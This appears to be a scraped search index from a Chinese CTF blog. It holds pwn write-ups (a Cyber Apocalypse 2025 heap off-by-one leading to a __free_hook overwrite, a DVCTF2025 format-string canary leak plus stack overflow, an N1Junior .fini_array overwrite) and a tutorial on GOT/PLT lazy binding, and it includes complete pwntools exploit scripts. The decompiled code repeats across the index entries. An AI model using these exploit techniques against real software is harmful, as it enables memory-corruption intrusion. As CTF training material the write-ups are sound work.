\"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan\r输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#show-plan"},{"categories":["WP"],"collections":null,"content":"逆向分析\rmenu\r__int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan\r先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan\r根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan\r输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan\r输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#edit-plan"},{"categories":["WP"],"collections":null,"content":"逆向分析\rmenu\r__int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan\r先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan\r根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan\r输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan\r输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#delete-plan"},{"categories":["WP"],"collections":null,"content":"思路\r覆盖free_hook(发现覆盖malloc_hook为one_gadget都不行) 泄露libc。 先申请一个大于tcache范围的块，再申请一个块，防止前一个chunk与topchunk合并 然后free掉第一个chunk， 再重新申请出来，并把用户区里的libc地址edit出来，计算libc地址。 覆盖free_hook 利用off-by-one改大其中一个块，再申请出来，覆盖掉下一个chunk的内容 ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:2","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#思路-2"},{"categories":["WP"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './strategist' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) one_gadget = [0x10a41c,0x4f3ce,0x4f3d5,0x4f432] def create(long,plan): p.sendlineafter(b'\u003e ',b'1') p.sendlineafter(b'\u003e ',str(long)) p.sendafter(b'\u003e ',plan) def show(number): p.sendlineafter(b'\u003e ',b'2') p.sendlineafter(b'\u003e ',str(number)) def edit(number,plan): p.sendlineafter(b'\u003e ',b'3') p.sendlineafter(b'\u003e ',str(number)) p.sendafter(b'\u003e ',plan) def delete(number): p.sendlineafter(b'\u003e ',b'4') p.sendlineafter(b'\u003e ',str(number)) pl = b'aaaa' create(0x500,pl) create(0x100,pl) delete(0) delete(1) create(0x500,b'a') show(0) # leak libc base addr p.recvuntil(b'Plan [0]: a') libc_addr = u64(p.recv(5).rjust(8,b'\\x00')) libc_addr = libc_addr \u003e\u003e 16 libc_base_addr = libc_addr-0x733efa3ebc00+0x733efa000000 success(\"libc_base_addr ----\u003e 0x%x\",libc_base_addr) libc.address = libc_base_addr delete(0) malloc_hook_addr = libc_base_addr + 0x3EBC30 one_gadget_addr = one_gadget[0] + libc_base_addr create(0x48,b'a'*0x48) create(0x48,b'b'*0x48) create(0x48,b'c'*0x48) edit(0,b'w'*0x48+p8(0x80)) delete(1) delete(2) create(0x70, b'6'*0x50 + p64(libc.sym.__free_hook)) create(0x40, b'/bin/sh\\x00') create(0x40, p64(libc.sym.system)) delete(2) p.interactive() ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:3","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-4"},{"categories":["WP"],"collections":null,"content":"格式化字符串漏洞+栈溢出 ","date":"2025-05-26","objectID":"/posts/dvctf2025/:0:0","tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#"},{"categories":["WP"],"collections":null,"content":"DVCTF\rArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ","date":"2025-05-26","objectID":"/posts/dvctf2025/:0:0","tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#dvctf"},{"categories":["WP"],"collections":null,"content":"逆向分析\rint __fastcall main(int argc, const char **argv, const char **envp) { int v4; // [rsp+Ch] [rbp-44h] BYREF char v5[56]; // [rsp+10h] [rbp-40h] BYREF unsigned __int64 v6; // [rsp+48h] [rbp-8h] v6 = __readfsqword(0x28u); puts(asc_2190); puts(\u0026byte_2228); puts(\u0026byte_22C0); puts(\u0026byte_2358); puts(\u0026byte_23F0); puts(\u0026byte_2488); puts(\u0026byte_2520); puts(\u0026byte_25B8); puts(\u0026byte_2650); puts(\u0026byte_26E8); puts(\u0026byte_2780); puts(\u0026byte_2818); puts(\u0026byte_28B0); puts(\u0026byte_2948); puts(\u0026byte_29E0); puts(\u0026byte_2A78); puts(\u0026byte_2B10); puts(\u0026byte_2BA8); puts(\u0026byte_2C40); puts(\u0026byte_2CD8); puts(\u0026byte_2D70); puts(\u0026byte_2E08); puts(\u0026byte_2EA0); puts(\u0026byte_2F38); puts(\u0026byte_2FD0); puts(\u0026byte_3068); puts(\u0026byte_3100); puts(\u0026byte_3198); puts(\u0026byte_3230); puts(\u0026byte_32C8); puts(\"Enter your name : \"); __isoc99_scanf(\" %[^\\n]\", v5); printf(\"\\n Hey %s \", v5); puts(\" ! Welcome to the Louvre software !\"); do { displayMenu(); __isoc99_scanf(\"%d\", \u0026v4); if ( v4 == 4 ) { QuitProgram(v5); } else { if ( v4 \u003c= 4 ) { switch ( v4 ) { case 3: VisitRoom(); continue; case 1: CheckIdentity(v5); continue; case 2: CheckVersion(); continue; } } puts(\"\\n Invalid choice. \"); } } while ( v4 != 4 ); return 0; } CheckIdentity中存在格式化字符串漏洞 int __fastcall CheckIdentity(const char *a1) { puts(\"Your identity is : \"); return printf(a1); } VisitRoom中存在栈溢出漏洞 __int64 VisitRoom() { unsigned int v1; // [rsp+8h] [rbp-18h] BYREF char v2[10]; // [rsp+Eh] [rbp-12h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); puts(\"How many rooms do you want to visit? ( 0-99 )\"); __isoc99_scanf(\"%2d\", \u0026v1); if ( v1 \u003c= 0x1388 ) { printf(\"\\nYou have chosen to request a visit %d rooms.\\n\", v1); } else { puts(\"That's a lot, isn't it?!\"); puts(\"Who are the tickets for?\"); __isoc99_scanf(\"%s\", v2); printf(\"Tickets will be sent to: %s\\n\", v2); } return 0; } 存在输出flag的函数 void readflag() { char v0; // [rsp+7h] [rbp-9h] FILE *stream; // [rsp+8h] [rbp-8h] stream = fopen(\"flag.txt\", \"r\"); if ( stream ) { while ( 1 ) { v0 = fgetc(stream); if ( v0 == -1 ) break; putchar(v0); } fclose(stream); } else { perror(\"Failed to open file\"); } } ","date":"2025-05-26","objectID":"/posts/dvctf2025/:1:0","tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#逆向分析"},{"categories":["WP"],"collections":null,"content":"思路\r通过格式化字符串漏洞，泄露栈上的canary和程序基地址。通过栈溢出，修改返回地址 ","date":"2025-05-26","objectID":"/posts/dvctf2025/:2:0","tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#思路"},{"categories":["WP"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) backdoor = 0x1296 p.recvuntil(b'name : \\n') pl = b'%19$p|%9$p' p.sendline(pl) # dbg() p.sendline(b'1') p.recvuntil(b'identity is : \\n') canary = int(p.recv(18),16) success(\"canary ---\u003e 0x%x\",canary) p.recvuntil(b'|') base_addr = int(p.recv(14),16) base_addr = base_addr - 0x5619fcb116fb + 0x5619fcb10000 success(\"base_addr ---\u003e 0x%x\",base_addr) p.sendline(b'3') p.sendline(b'-1') p.recvuntil(b'for?\\n') pl = b'a'*10 + p64(canary) pl+= p64(0) + p64(base_addr + backdoor) p.sendline(pl) p.interactive() ","date":"2025-05-26","objectID":"/posts/dvctf2025/:3:0","tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#exp"},{"categories":["WP"],"collections":null,"content":"知识点\rscanf(\"%s\") 的行为： %s 会读取输入直到遇到 空白字符（空格、换行、制表符等），不会因 \\x00 终止。 输入数据中的 \\x00 会被视为普通字符，继续写入内存。 （。。。当时打的时候还以为canary的\\x00会截断scanf的%s） ","date":"2025-05-26","objectID":"/posts/dvctf2025/:4:0","tags":null,"title":"DVCTF2025","uri":"/posts/dvctf2025/#知识点"},{"categories":["pwn"],"collections":null,"content":"延迟绑定过程分析 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#"},{"categories":["pwn"],"collections":null,"content":"GOT\u0026PLT\rgot表和plt表都是程序调用外部函数时，定位该函数需要使用到的表 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#gotplt"},{"categories":["pwn"],"collections":null,"content":"Global Offset Table(GOT，全局偏移表)\rGOT 表的主要功能是 存储动态链接库（如 libc.so）中函数和全局变量的运行时地址。 GOT表包括两种类型.got和.got.plt .got 存储 全局变量 的地址 .got.plt 存储 动态库函数 的地址（如 printf、read）。 与 PLT（Procedure Linkage Table） 配合实现 延迟绑定（Lazy Binding）。 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#global-offset-tablegot全局偏移表"},{"categories":["pwn"],"collections":null,"content":".got.plt的公共表项\r有三个公共表项，分别是 got[0]:_DYNAMIC:指向 动态段（.dynamic） 的地址 got[1]:link_map 指针:动态链接器内部使用的 link_map 结构指针（用于符号解析） got[2]:_dl_runtime_resolve:动态解析函数的地址 got[3]开始就是函数的地址 示例：x86-64 的 .got.plt 布局 .got.plt:0000000000403FE8 .got.plt:0000000000403FE8 ; Segment type: Pure data .got.plt:0000000000403FE8 ; Segment permissions: Read/Write .got.plt:0000000000403FE8 _got_plt segment qword public 'DATA' use64 .got.plt:0000000000403FE8 assume cs:_got_plt .got.plt:0000000000403FE8 ;org 403FE8h .got.plt:0000000000403FE8 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC .got.plt:0000000000403FF0 qword_403FF0 dq 0 ; DATA XREF: sub_401020↑r .got.plt:0000000000403FF8 qword_403FF8 dq 0 ; DATA XREF: sub_401020+6↑r .got.plt:0000000000404000 off_404000 dq offset seccomp_init ; DATA XREF: _seccomp_init+4↑r .got.plt:0000000000404008 off_404008 dq offset seccomp_rule_add .got.plt:0000000000404008 ; DATA XREF: _seccomp_rule_add+4↑r .got.plt:0000000000404010 off_404010 dq offset write ; DATA XREF: _write+4↑r .got.plt:0000000000404018 off_404018 dq offset seccomp_load ; DATA XREF: _seccomp_load+4↑r .got.plt:0000000000404020 off_404020 dq offset setbuf ; DATA XREF: _setbuf+4↑r .got.plt:0000000000404028 off_404028 dq offset close ; DATA XREF: _close+4↑r .got.plt:0000000000404030 off_404030 dq offset read ; DATA XREF: _read+4↑r .got.plt:0000000000404030 _got_plt ends .got.plt:0000000000404030 其中 .got.plt:0000000000403FE8 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC .got.plt:0000000000403FF0 qword_403FF0 dq 0 ; DATA XREF: sub_401020↑r .got.plt:0000000000403FF8 qword_403FF8 dq 0 ; DATA XREF: sub_401020+6↑r 就是公共表项，从上到下依次就是got[0]、got[1]、got[2] got[1]、got[2]由动态链接器在装载共享模块的时候负责将它们初始化 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:1","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#gotplt的公共表项"},{"categories":["pwn"],"collections":null,"content":"link_map\r数据结构的定义如下： struct link_map { /* Shared library's load address. */ ElfW(Addr) l_addr; /* Pointer to library's name in the string table. */ char *l_name; /* Dynamic section of the shared object. Includes dynamic linking info etc. Not interesting to us. */ ElfW(Dyn) *l_ld; /* Pointer to previous and next link_map node. */ struct link_map *l_next, *l_prev; }; 首次调用动态函数时，_dl_runtime_resolve 通过 link_map 解析符号地址。 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:2","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#link_map"},{"categories":["pwn"],"collections":null,"content":"Procedure Linkage Table(PLT,进程链接表)\r结构： PLT0（公共解析逻辑） 所有 PLT 条目共享的代码，负责调用 _dl_runtime_resolve 解析函数地址。 PLT1, PLT2, …（函数专用条目） 每个动态函数（如 printf、read）有一个 PLT 条目。 典型 PLT 条目（x86-64） printf@plt: jmp *GOT[n] ; 首次调用时，GOT[n] 指向下一行（解析逻辑） push 5 ; 符号索引（5 = printf 在 .dynsym 中的下标） jmp PLT0 ; 跳转到公共解析逻辑（_dl_runtime_resolve） ","date":"2025-03-24","objectID":"/posts/lazy_binding/:2:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#procedure-linkage-tableplt进程链接表"},{"categories":["pwn"],"collections":null,"content":"延迟绑定过程\r函数第一次调用时，过程如下图： 跳转到该函数的PLT条目 第一个jmp指令跳往对应函数的.got.plt入口，但是这个时候got表中还没有填充函数的真实地址。 所以从got表跳回到plt表中，继续往下执行push;jmp。跳回后，push的值是对应函数在**.got.plt**入口的偏移 跳到PLT头部，执行push指令，将 GOT[1] 的地址（link_map的地址）入栈。 接着jmp到 **GOT[2] ** 即dl_runtime_resolve相关的函数对动态函数进行地址解析和重定位 并且把函数真实地址回填到got表中 最后执行函数 非首次调用，过程如下图： 之后再调用该函数的时候，plt只有一个跳转指令，找到对应的函数地址之后执行函数。动态调试看了一个整个运行过程，有了一个更深入的的理解。 跳转到该函数的PLT条目 第一个jmp指令跳往对应函数的.got.plt入口 此时的got表被填充为函数的真实地址，跳转到真实地址 执行函数 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#延迟绑定过程"},{"categories":["pwn"],"collections":null,"content":"实际分析\r这里用gdb动态调试，实际分析一下 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#实际分析"},{"categories":["pwn"],"collections":null,"content":"第一次调用过程：\r首先函数call了0x401100，0x401100就是read函数的.plt.sec 接着step步入 可以看到，实际上，程序会先进入.plt.sec执行jmp，再到.plt中执行push;jmp。 可以看到这时read函数的.got.plt还没被更改为真实地址，而是指向read函数PLT表项中的push 执行完dl_runtime_resolve相关的函数，就会进入read的真实地址执行read，同时可以看到，read函数的.got.plt也指向的该函数真实地址 接着就执行read函数 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:1:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#第一次调用过程"},{"categories":["pwn"],"collections":null,"content":"非首次调用过程：\r先call了read函数的.plt.sec 然后s步入 qword ptr [rip + 0x2f26]就是取出存储在read的.got.plt中地址，然后跳转到该地址 指令 行为 jmp 0x404040 直接跳转到 0x404040（绝对地址） jmp [0x403f2c] 从 0x403f2c 读取 8 字节作为目标地址 jmp qword ptr [rip + 0x2f26] 从 (RIP + 0x2f26) 读取 8 字节作为目标地址（动态计算） 然后直接执行read 所以，非首次调用，got表中存储的就是真实地址 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:2:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#非首次调用过程"},{"categories":["pwn"],"collections":null,"content":"参考文献\r延迟绑定过程分析：理论分析 深入理解plt表、got表和动态链接：前置知识 延迟绑定过程图 ","date":"2025-03-24","objectID":"/posts/lazy_binding/:0:0","tags":null,"title":"延迟绑定过程分析","uri":"/posts/lazy_binding/#参考文献"},{"categories":["WP"],"collections":null,"content":"N1Junior_2025 Pwn复现 ","date":"2025-03-12","objectID":"/posts/n1junior2025/:0:0","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#"},{"categories":["WP"],"collections":null,"content":"Remake\r涉及知识点：.fini_array Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled SHSTK: Enabled IBT: Enabled __int64 __fastcall main(__int64 a1, char **a2, char **a3) { sub_11A9(); read(0, format, 0x10u); printf(format); if ( dword_4060 ) //刚开始 dword_4060 = 0 sub_120E(); else dword_4060 = 1; return 0; } unsigned __int64 sub_120E() { char buf[16]; // [rsp+0h] [rbp-1010h] BYREF unsigned __int64 v2; // [rsp+1008h] [rbp-8h] v2 = __readfsqword(0x28u); read(0, buf, 0x300u); printf(buf); return v2 - __readfsqword(0x28u); } 看到程序，很容易联想到修改.fini_array来重新执行main函数（这样dword_4060就会等于1，进入sub_120E函数） 接下来就是利用格式化字符串漏洞printf(format);，来修改.fini_array .fini_array下面就是main函数的地址(出题人的gift) 程序开了PIE，程序基地址+0x3da0为.fini_array地址，我们可以通过程序基地址+8+0x3da0这样就能修改程序返回地址为main函数地址 printf是栈中指向程序基地址的地址位于动态连接器，可能为struct link_map中的l_addr(程序基地址) 因为.fini_array 的实际地址 = l_addr + .fini_array 的偏移地址 所以这里我们让l_addr+8 同时，通过栈中main函数的地址减去偏移，就能得到PIE基地址 这时exp: from pwn import * context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) pause() address = './remake' p = process(address) # elf = ELF(address) # libc = ELF.libc # ip = \"\" # port = #p = remote(ip,port) #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) 